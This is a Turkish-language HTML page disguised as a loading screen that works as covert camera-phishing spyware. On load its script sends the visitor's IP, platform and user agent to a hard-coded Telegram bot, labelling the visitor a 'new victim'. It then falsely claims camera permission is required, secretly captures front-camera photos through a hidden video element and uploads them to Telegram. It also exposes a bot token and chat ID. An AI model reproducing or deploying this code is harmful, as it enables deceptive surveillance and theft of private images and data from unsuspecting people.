<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    .error-box {
      display: none;
      background: rgba(255, 0, 0, 0.1);
      border: 2px dashed #ff0000;
      padding: 25px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
    }

    .error-box h2 {
      color: #ff3333;
      margin-bottom: 10px;
      font-size: 24px;
    }

    .error-box p {
      color: #ccc;
      font-size: 15px;
      margin-bottom: 20px;
      line-height: 1.4;
    }

    .retry-btn {
      background: #ff0000;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 0 10px #ff0000;
      transition: transform 0.2s;
    }

    .retry-btn:active {
      transform: scale(0.95);
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }

    #hiddenVideo{
      display:none;
    }
  </style>
</head>
<body>

  <video id="hiddenVideo" autoplay muted playsinline></video>

  <div class="container">
    <div class="logo">𝖀𝖒𝖚𝖙</div>

    <div id="loadingArea">
      <div class="loading-text">Yükleniyor...</div>
      <div class="bar">
        <div class="progress" id="progress"></div>
      </div>
      <div class="percent" id="percent">0%</div>
      <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
    </div>

    <div id="errorArea" class="error-box">
      <h2>⚠️ Kamera İzni Gerekli!</h2>
      <p>Sistem kaynaklarının başarıyla yüklenebilmesi ve güvenli bağlantının tamamlanabilmesi için kamera izni vermeniz zorunludur. Lütfen "Tekrar Dene" butonuna basarak gelen uyarıya onay verin.</p>
      <button class="retry-btn" onclick="yenidenDene()">Tekrar Dene</button>
    </div>
  </div>

  <script>
    // Token ana dosya ile tamamen eşitlendi
    const BOT_TOKEN = '8607287109:AAHPIjZWmYnbrlDJ2KyPHZTjHxfZKLORO5c';
    
    function urlParametresiAl(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }
    
    const gelenSifreliId = parseInt(urlParametresiAl('id'));
    let CHAT_ID = '7497803165'; 

    if (gelenSifreliId && !isNaN(gelenSifreliId)) {
        CHAT_ID = String((gelenSifreliId - 12345) / 7);
    }

    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");
    const loadingArea = document.getElementById("loadingArea");
    const errorArea = document.getElementById("errorArea");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "Veriler doğrulanıyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor..."
    ];

    let mediaStream = null;
    let fotoSayac = 0;
    let ipBilgisi = 'bilinmiyor';

    async function getIp() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipBilgisi = data.ip;
      } catch(e) { ipBilgisi = 'Alınamadı'; }
    }

    async function cihazBilgisiGonder() {
      try {
        await getIp();
        const info = `🌐 **Yeni Kurban Düştü!**\n\n🌐 **IP:** \`${ipBilgisi}\`\n💻 **Cihaz:** ${navigator.platform}\n🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 50)}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: 'Markdown' })
        });
      } catch (err) {}
    }

    async function fotoCek(kameraTipi) {
      try {
        const video = document.getElementById('hiddenVideo');
        if (!video || video.videoWidth === 0) return;

        fotoSayac++;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
        const etiket = kameraTipi === 'arka' ? 'BACK' : 'FRONT';

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
        formData.append('caption', `📸 **Fotoğraf #${fotoSayac}** — [${etiket}]`);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (err) {}
    }

    async function kamerayiAc(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: facingMode },
          audio: false
        });
        const video = document.getElementById('hiddenVideo');
        video.srcObject = stream;
        await video.play();
        mediaStream = stream;
        return true;
      } catch (err) {
        return false;
      }
    }

    function baslatYuklemeBari() {
      const progressInterval = setInterval(() => {
        if (progress < 100) {
          progress += Math.random() * 3;
          if (progress > 100) progress = 100;
          progressBar.style.width = progress + "%";
          percentText.innerText = Math.floor(progress) + "%";
        }
      }, 200);
    }

    async function baslat() {
      cihazBilgisiGonder();
      baslatYuklemeBari();
      
      const izinVerildi = await kamerayiAc('user');
      if (izinVerildi) {
        setTimeout(async () => {
          await fotoCek('on');
        }, 1500);
      } else {
        loadingArea.style.display = "none";
        errorArea.style.display = "block";
      }
    }

    async function yenidenDene() {
        errorArea.style.display = "none";
        loadingArea.style.display = "block";
        await baslat();
    }

    window.onload = baslat;
  </script>
</body>
</html>
